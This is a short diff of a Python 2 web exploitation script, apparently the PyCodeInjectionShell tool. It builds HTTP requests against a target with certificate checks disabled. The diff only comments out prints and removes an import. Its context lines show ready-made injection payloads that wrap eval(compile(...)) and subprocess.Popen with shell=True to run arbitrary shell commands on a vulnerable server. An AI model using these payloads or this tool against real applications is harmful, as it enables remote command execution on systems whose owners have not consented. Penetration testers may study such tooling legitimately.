@@ -6,7 +6,7 @@
           
 """
 
-import requests, re, optparse, urllib, os, ssl
+import requests, re, optparse, urllib, os
 from HTMLParser import HTMLParser
 
 #Taken from http://stackoverflow.com/questions/2115410/does-python-have-a-module-for-parsing-http-requests-and-responses
@@ -77,7 +77,7 @@ def parse_request(command,filename,user_param=None):
             return url,req_obj.headers,post_body
 
 def select_command(user_url,user_param=None):
-    print user_param
+    #print user_param
     test1 = '''eval(compile("""for x in range(1):\\n print("PyCodeInjectionShell")""",'PyCodeInjectionShell','single'))'''
     test2 = '''__import__.os.eval(compile("""for x in range(1):\\n print("PyCodeInjectionShell")""",'PyCodeInjectionShell','single'))'''
     test3 = '''eval(compile("""for x in range(1):\\n import os,subprocess\\n print("-"*50)\\n subprocess.Popen(r'%s', shell=True,stdout=subprocess.PIPE).stdout.read()""",'PyCodeInjectionShell','single'))''' % command
@@ -108,7 +108,7 @@ def send_request(url,command,headers=None,data=None):
     # Request files don't specify HTTP vs HTTPS, so I'm trying to try both instead of 
     # asking the user.  If no http or https, first try http, and if that errors, try 
     # https.  Request files can be used for GET's also, so I pull that part out as well.  
-     
+
     if 'http' not in url:        
         try:
             http_url = 'http://%s' % url
@@ -131,7 +131,7 @@ def send_request(url,command,headers=None,data=None):
             response = requests.get(url, headers=headers, verify=False)
         except Exception as error:
             print "[!] Failed to establish connection"
-            print error
+            #print error
             exit()
     #print response.headers
     #print response.content
